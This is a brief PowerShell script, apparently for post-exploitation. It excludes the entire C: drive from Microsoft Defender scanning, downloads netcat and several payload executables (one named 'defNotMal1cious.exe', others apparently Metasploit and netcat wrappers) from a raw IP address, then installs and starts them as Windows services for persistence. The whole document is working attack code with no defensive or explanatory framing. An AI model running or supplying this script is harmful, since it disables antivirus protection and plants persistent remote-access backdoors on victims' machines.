Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.exe -OutFile C:/windowsWrapperMSF.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
New-Service -Name 'windowsMSF' -BinaryPathName 'c:\windowsWrapperMSF.exe'
New-Service -Name 'windowsNC' -BinaryPathName 'c:\windowsWrapperNC.exe'
Start-Service -Name "windowsMSF"
Start-Service -Name "windowsNC"
